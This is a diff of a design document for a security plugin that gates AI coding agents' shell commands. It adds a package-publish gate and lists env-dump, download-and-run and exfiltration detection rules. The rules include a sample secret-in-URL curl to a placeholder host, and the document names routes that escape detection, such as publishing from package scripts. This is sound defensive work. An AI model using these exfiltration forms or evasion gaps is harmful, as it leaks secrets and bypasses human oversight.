@@ -8,7 +8,7 @@ solana-ai-kit ([ai-kit#264](https://github.com/solanabr/ai-kit/issues/264)) and 
 
 | Owner | Owns |
 |---|---|
-| solana-ai-kit | The OS sandbox (filesystem denies, `deniedDomains` at the syscall), permission rules, tier selection and regeneration (`/firewall`, `.claude/security.json`), and its own hooks for git, publish, fetch-and-execute and `gh`. This plugin now carries hook-level counterparts for the git and `gh`, fetch-and-execute and MCP tool-name rules (below), kept as defence in depth; the publish gate is not covered here |
+| solana-ai-kit | The OS sandbox (filesystem denies, `deniedDomains` at the syscall), permission rules, tier selection and regeneration (`/firewall`, `.claude/security.json`), and its own hooks for git, publish, fetch-and-execute and `gh`. This plugin now carries hook-level counterparts for the git and `gh`, fetch-and-execute, publish and MCP tool-name rules (below), kept as defence in depth |
 | safe-ai-skill | Solana-semantic gates (cluster, amounts, irreversible and authority actions, mainnet, grants); secrets for plugin-only users (key material and home stores hard-denied; project `.env` reads and writes by tier, as the kit does; the `env` CLI, varlock and redaction); supply chain (scan, pins, Skill/slash deny, no moves); the tier as an **input**; a best-effort exfil tripwire ([#19](https://github.com/solanabr/safe-ai-skill/issues/19)) and the git and `gh`, tamper, download-and-run, env-dump, encoded-command and MCP tool-name gates (see [Tripwire gates by tier](#tripwire-gates-by-tier)); a settings manager that writes the sandbox and permission block ([`firewall`](#settings-manager)) |
 | Shared | Versioned list files in `policy/shared/` (`credentials.list`, `exfil-hosts.list`, `onchain-verbs.list`), a conformance corpus and one headless rule |
 
@@ -221,6 +221,7 @@ Gates that judge command text, tool arguments or file content rather than a path
 | MCP tool refused by name: Playwright `browser_evaluate`, Cloudflare `execute` | n/o | n/o | n/o | deny |
 | `cargo install`/`binstall` of an undeclared crate, `go install`/`go run pkg@version` of a module not in `go.mod`, `uv run --with` of an undeclared package | n/o | n/o | n/o | deny |
 | Download-and-run, undeclared one-shot runner, `cargo install --git` outside the allowlist, mainnet Node script | ask | ask | ask | deny |
+| Package publish: `npm`, `pnpm`, `yarn` or `bun publish`, `cargo publish`, `twine upload` and the other registry uploads (not a dry run) | ask | ask | deny | deny |
 | Env dump: `/proc/*/environ`, `ps e`, printing a secret-named variable | deny | deny | deny | deny |
 | Env dump: bare `printenv`/`env`/`export -p`/`set`/`declare -p` (values blanked in the output) | n/o | n/o | n/o | n/o |
 | Env dump piped into anything but a line filter, or written to a file | ask | ask | ask | ask |
@@ -332,6 +333,18 @@ The allowlists are constants in `gates/fetchexec.rs`: runner packages `create-so
 They are read behind wrappers (`nice`, `flock`, `timeout`, `sudo`) and across line continuations. The High allowlists are narrower than the runner allowlists above and are constants in `gates/fetchexec.rs`.
 
 The first three bullets follow `supply_chain.exec_install_scripts`: `deny` denies them at every tier, `allow` gives them no opinion. The runner, `cargo` and mainnet-script findings always ask.
+
+## Package publish
+
+`gates/publish.rs` judges commands that upload a package version to a registry, in `gate-bash-secrets` (so also under Codex and opencode, where an `ask` is a deny). A registry keeps what it publishes: npm never reuses a version, and a yanked crates.io version stays downloadable. The registry is also a host every other check lets through, so no host list stops the upload. Off acts as Relaxed.
+
+| What | Off / Relaxed | Medium | High |
+|---|---|---|---|
+| A publish: `npm publish`, `pnpm publish`, `yarn publish`, `yarn npm publish`, `bun publish`, `deno publish`, `jsr publish`, `lerna publish`, `changeset publish`, `cargo publish`, `cargo workspaces publish`, `twine upload`, `poetry publish`, `uv publish`, `flit publish`, `hatch publish`, `pdm publish`, `gem push`, `dotnet nuget push`, `nuget push`, `dart pub publish`, `flutter pub publish`, `mix hex.publish`, `pod trunk push`, `vsce publish`, `ovsx publish` | ask | deny | deny |
+
+Headless turns the ask into a deny. A dry run passes where the tool has one: `--dry-run` for npm, pnpm, `yarn npm`, bun, deno, jsr, cargo, `cargo workspaces`, poetry, uv, pdm, dart, flutter and mix, and `-n` for cargo, dart and flutter. Positions come from the shell parser, so a commit message or a changelog line naming `npm publish` is data. The publisher is found behind options before its subcommand (`npm --registry R publish`, `cargo +nightly publish`, `pnpm --filter ./pkg publish`), behind wrappers (`flock`, `taskset`, `env`, `sudo`, …), package runners (`npx`, `pnpm dlx`, `yarn dlx`, `bunx`, `uvx`, `npm exec`, …) and `python -m twine`, in a `yarn` or `pnpm` that runs a publisher's binary (`yarn lerna publish`), in `yarn workspace NAME …` and `yarn workspaces foreach …`, and in the strings git runs as shell code.
+
+**Not seen:** a publish inside a package script (`npm run release`), a Makefile target or a script file, a program or subcommand held in a variable, and an upload by `curl`.
 
 ## Git and gh guard
 
@@ -506,7 +519,7 @@ One rule, shared with the kit.
 
 The list of what this layer cannot close, and which of them the kit's sandbox and permission rules close, is in [SECURITY.md](../SECURITY.md#known-holes). Specific to this plugin's redaction: failed tool results (non-zero Bash exits, tool errors) reach the model unredacted, because Claude Code lets a hook replace only a successful result. One cost is deliberate and not a hole: the agent cannot read its own auto-memory with its tools (see [Key material and home credential stores](#key-material-and-home-credential-stores)).
 
-The full-coverage work leaves these open, as not yet covered rather than as design limits: destructive and system commands (shutdown, mass deletes beyond the wallet gates), process kill, the publish gate (`npm publish`, `cargo publish`), `docker` cleanup, and reads of shell history files (the settings manager's sandbox `denyRead` covers history for sandboxed commands). Three exfil items: an interpreter one-liner that sends a key file, an inline POST to an unknown host (it asks, at every tier, and is not denied at High), and an environment variable read inside a URL (`curl https://h/?k=$KEY`), which has no opinion at High.
+The full-coverage work leaves these open, as not yet covered rather than as design limits: destructive and system commands (shutdown, mass deletes beyond the wallet gates), process kill, `docker` cleanup, and reads of shell history files (the settings manager's sandbox `denyRead` covers history for sandboxed commands). Three exfil items: an interpreter one-liner that sends a key file, an inline POST to an unknown host (it asks, at every tier, and is not denied at High), and an environment variable read inside a URL (`curl https://h/?k=$KEY`), which has no opinion at High.
 
 ## Migration from profiles
 
